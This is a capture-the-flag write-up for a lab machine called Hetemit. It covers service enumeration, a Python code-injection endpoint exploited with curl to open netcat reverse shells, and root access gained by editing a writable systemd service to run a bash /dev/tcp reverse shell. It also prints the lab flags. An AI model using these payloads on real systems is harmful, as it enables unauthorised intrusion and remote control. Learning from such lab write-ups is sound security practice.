# CTF Writeup: Hetemit

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.230.117
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 18:20 EST
Nmap scan report for 192.168.230.117
Host is up (0.091s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.165
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.95%I=7%D=12/21%Time=694880EB%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetRequ
SF:est,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x
SF:20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<
SF:html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\
SF:n\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\
SF:x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20back
SF:ground-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x2
SF:0\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-
SF:family:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x2
SF:0\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-
SF:height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x
SF:20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-sp
SF:ace:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n
SF:\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\
SF:x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n
SF:\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20
SF:\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x
SF:20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20padd
SF:ing:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{
SF:\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20
SF:\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;
SF:\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x2
SF:0color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x2
SF:0\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\
SF:x20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-T
SF:ype:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20char
SF:set=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\
SF:x20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20
SF:\x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\
SF:x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\
SF:x20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans
SF:-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\
SF:x20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20
SF:\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x2
SF:0\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20
SF:#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\
SF:x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\
SF:x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:
SF:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20
SF:\x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x2
SF:0\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n
SF:\x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x
SF:20font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x2
SF:0\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\
SF:x20\x20\x20\x20\x20\x20bord");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-12-21T23:21:27
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   173.98 ms 192.168.45.1
2   173.92 ms 192.168.45.254
3   174.22 ms 192.168.251.1
4   174.22 ms 192.168.230.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.60 seconds
```

Since the target system is running samba, I will utilize enum4linux to enumerate.

```
enum4linux -a 192.168.230.117                  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 21 18:25:42 2025

 =========================================( Target Information )=========================================                                                                                           
                                                                                                  
Target ........... 192.168.230.117                                                                
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on 192.168.230.117 )==========================                                                                                            
                                                                                                  
                                                                                                  
[E] Can't find workgroup/domain                                                                   
                                                                                                  
                                                                                                  

 ==============================( Nbtstat Information for 192.168.230.117 )==============================                                                                                            
                                                                                                  
Looking up status of 192.168.230.117                                                              
No reply from 192.168.230.117

 ==================================( Session Check on 192.168.230.117 )==================================                                                                                           
                                                                                                  
                                                                                                  
[+] Server 192.168.230.117 allows sessions using username '', password ''                         
                                                                                                  
                                                                                                  
 ===============================( Getting domain SID for 192.168.230.117 )===============================                                                                                           
                                                                                                  
Domain Name: SAMBA                                                                                
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                              
                                                                                                  
                                                                                                  
 =================================( OS information on 192.168.230.117 )=================================                                                                                            
                                                                                                  
                                                                                                  
[E] Can't get OS info with smbclient                                                              
                                                                                                  
                                                                                                  
[+] Got OS info for 192.168.230.117 from srvinfo:                                                 
        HETEMIT        Wk Sv PrQ Unx NT SNT Samba 4.11.2                                          
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 192.168.230.117 )======================================                                                                                           
                                                                                                  
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                           
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.230.117 )================================                                                                                           
                                                                                                  
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                             

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Cmeeks          Disk      cmeeks Files
        IPC$            IPC       IPC Service (Samba 4.11.2)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 192.168.230.117 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.230.117                                                   
                                                                                                  
//192.168.230.117/print$        Mapping: DENIED Listing: N/A Writing: N/A                         
//192.168.230.117/Cmeeks        Mapping: OK Listing: DENIED Writing: N/A

[E] Can't understand response:                                                                    
                                                                                                  
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                        
//192.168.230.117/IPC$  Mapping: N/A Listing: N/A Writing: N/A

 ==========================( Password Policy Information for 192.168.230.117 )==========================                                                                                            
                                                                                                  
Password:                                                                                         


[+] Attaching to 192.168.230.117 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] HETEMIT
        [+] Builtin

[+] Password Info for Domain: HETEMIT

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                              
                                                                                                  
                                                                                                  
Password Complexity: Disabled                                                                     
Minimum Password Length: 5


 =====================================( Groups on 192.168.230.117 )=====================================                                                                                            
                                                                                                  
                                                                                                  
[+] Getting builtin groups:                                                                       
                                                                                                  
                                                                                                  
[+]  Getting builtin group memberships:                                                           
                                                                                                  
                                                                                                  
[+]  Getting local groups:                                                                        
                                                                                                  
                                                                                                  
[+]  Getting local group memberships:                                                             
                                                                                                  
                                                                                                  
[+]  Getting domain groups:                                                                       
                                                                                                  
                                                                                                  
[+]  Getting domain group memberships:                                                            
                                                                                                  
                                                                                                  
 =================( Users on 192.168.230.117 via RID cycling (RIDS: 500-550,1000-1050) )=================                                                                                           
                                                                                                  
                                                                                                  
[I] Found new SID:                                                                                
S-1-22-1                                                                                          

[I] Found new SID:                                                                                
S-1-5-32                                                                                          

[I] Found new SID:                                                                                
S-1-5-32                                                                                          

[I] Found new SID:                                                                                
S-1-5-32                                                                                          

[I] Found new SID:                                                                                
S-1-5-32                                                                                          

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                       
                                                                                                  
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                 
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                       
                                                                                                  
S-1-22-1-1000 Unix User\cmeeks (Local User)                                                       

[+] Enumerating users using SID S-1-5-21-3325954428-699464429-3406591564 and logon username '', password ''                                                                                         
                                                                                                  
S-1-5-21-3325954428-699464429-3406591564-501 HETEMIT\nobody (Local User)                          
S-1-5-21-3325954428-699464429-3406591564-513 HETEMIT\None (Domain Group)

 ==============================( Getting printer info for 192.168.230.117 )==============================                                                                                           
                                                                                                  
No printers returned.                                                                             


enum4linux complete on Sun Dec 21 18:51:30 2025
```

The Cmeeks share looks rather interesting, trying to connect to it didn't work, since we get access denied.


```
smbclient \\\\192.168.230.117\\Cmeeks
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

The Webpage running on port 80 is also just an unconfigured default page.

Let's move onto the odd port 18000. Observing it on the webpage it apparently is an application which has an exposed api index and also allows the functionality of creating users, it's name is "Protomba".

It has an login prompt and an register functionality.

The Service running on port 50000 seems to be an API Endpoint, with 2 Directories. The /verify endpoint has an "code" variable.

Which seems to be misconfigures, since we are able to perform arithmetic functions.

```
curl -X POST --data "code=2*2" http://192.168.230.117:50000/verify
4     
```

Since this api endpoint is utilizing python, we can utilize os.system to perform system commands on the target system since we know the server is processing the commands.

Further testing reveals that an command which is true, prompts 0 and an command which is false prompts 256.

```
curl -X POST --data "code=os.system('which nc')" http://192.168.230.117:50000/verify
0     
```

As we can see from the following netcat is hosted on the target system. Let's use netcat in order to get RCE!

I first started up my nc listener on port 80.

```
nc -lvnp 80
```

And then proceeded to execute the command.

```
curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.165 80')" http://192.168.230.117:50000/verify
```

Gained RCE as user "cmeeks".

```
nc -lvnp 80                                
listening on [any] 80 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.230.117] 51294
whoami
cmeeks
```

## Privilege Escalation

Performed Shell hardening in order to improve shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Retrieved local.txt in /home/cmeeks

```
216f7faf5b4b7d3ae5397db5e28906a1
```

Enumerated Users on the target system.

```
[cmeeks@hetemit config]$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
cmeeks:x:1000:1000::/home/cmeeks:/bin/bash
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
```


I did check for writable system files & indeed there is 3 writable files.

```
[cmeeks@hetemit restjson_hetemit]$ find /etc -writable 2>/dev/null
/etc/systemd/system/multi-user.target.wants/pythonapp.service
/etc/systemd/system/systemd-timedated.service
/etc/systemd/system/pythonapp.service
```

We can utilize the pythonapp.service to execute an malicious command with root rights. Therefore we will add the following into the 
"ExecStart" variable. Also don't forget to change the "User" variable to root, so we get root shell.

```
ExecStart=nc 192.168.230.117 22 -e /bin/bash
User=root
```

This should allow us to get an RCE as root on port 22.

Let's start up our listener on port 22.

```
nc -lvnp 22
```

Now we just need to restart the service, although I usually always stop the and start the service with systemctl, this time this didn't work since it requires authentication.

```
[cmeeks@hetemit restjson_hetemit]$ systemctl stop /etc/systemd/system/pythonapp.service
Failed to stop etc-systemd-system-pythonapp.service.mount: Interactive authentication required.
See system logs and 'systemctl status etc-systemd-system-pythonapp.service.mount' for details.
```

But we have the ability to run /sbin/reboot with sudo rights.

```
[cmeeks@hetemit restjson_hetemit]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

After restarting the process I haven't gotten a shell back. I'm assuming the firewall blocks the ports I utilized port 443 & 22. Let's try it with port 80.

```
sudo /sbin/reboot
```

So my initial plan was to revert the box, start up my listener on port 22 to gain initial access and prompt the command with port 22 instead of 80 for the initial access and modify the system file with port 80.

```
nc -lvnp 22
curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.165 22')" http://192.168.230.117:50000/verif
```

I repeated the whole process. Edited the system file and changed it to root and netcat reverse connection.

Started up my listener on port 80 & rebooted the service.

```
nc -lvnp 80
```
```
ExecStart=nc 192.168.230.117 80 -e /bin/bash
User=root
```

This also didn't work!

So I tried it with port 50000 & this time it worked! I gained RCE as user "root".

I utilized the following modifications in order for it to work.

```
ExecStart=/bin/bash -c ‘bash -i >& /dev/tcp/192.168.45.161/50000 0>&1’
User=root
```

```
rlwrap nc -lvnp 50000
listening on [any] 50000 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.230.117] 60722
bash: cannot set terminal process group (1213): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit restjson_hetemit]#
```

Retrieved proof.txt in /root directory.

```
03cdf6caea533876ada52318ec0a461f
```
